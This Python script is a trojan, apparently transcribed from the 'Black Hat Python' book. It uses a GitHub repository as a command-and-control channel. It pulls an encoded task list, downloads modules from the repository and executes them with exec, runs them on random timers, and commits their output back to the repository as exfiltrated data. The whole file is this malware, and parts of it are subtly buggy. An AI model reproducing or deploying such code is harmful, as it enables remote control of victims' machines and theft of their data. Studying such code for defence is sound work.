#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Oct  8 08:32:54 2019

@author: max
"""

import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os

from github3 import login

trojan_id = 'abc'

trojan_config = '%s.json'%trojan_id
data_path = 'data/%s/'%trojan_id
trojan_modules = []
configured = False
task_queue = queue.Queue()

my_pass = ''
with open('/tmp/tmp-pass.txt') as p:
    my_pass = p.readline()


def connect_to_github():
    gh = login(username='clesiorki2018', password=my_pass)
    repo = gh.repository('clesiorki2018','livro-black-hat-python')
    branch = repo.branch('master')
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    
    for filename in tree.tree:
        
        if filepath in filename.path:
            print('[*] Found file %s'%filepath)
            blob = repo.blob(filename._json_data['sha'])
            
            return blob.content
        return None
    
    
def get_trojan_config():
    global configured
    config_jason    = get_file_contents(trojan_config)
    config          = json.loads(base64.b64decode(config_jason))
    configured      = True
    
    for task in config():
        
        if task['module'] not in sys.modules:
            exec('import %s'%task['module'])
    
    return config


def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = 'data/%s/%d.data'%(trojan_id, random.randint(1000,100000))
    repo.create_file(remote_path,'Commit message',base64.b64encode(data.encode()))
    
    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ''
        
    def find_module(self,fullname,path=None):
        if configured:
            print('[*] Attemptingto retrieve %s'%fullname)
            new_library = get_file_contents('Modules/%s'%fullname)
            
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
            
    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name]
        
        return module
    
    
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    
    # Armazena o resultado em nosso repositório
    store_module_result(result)
    
    return


# Laço principal do trojan
sys.meta_path = [GitImporter()]

while True:
    
    if task_queue.empty():
        config = get_trojan_config()
        
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1000, 10000))
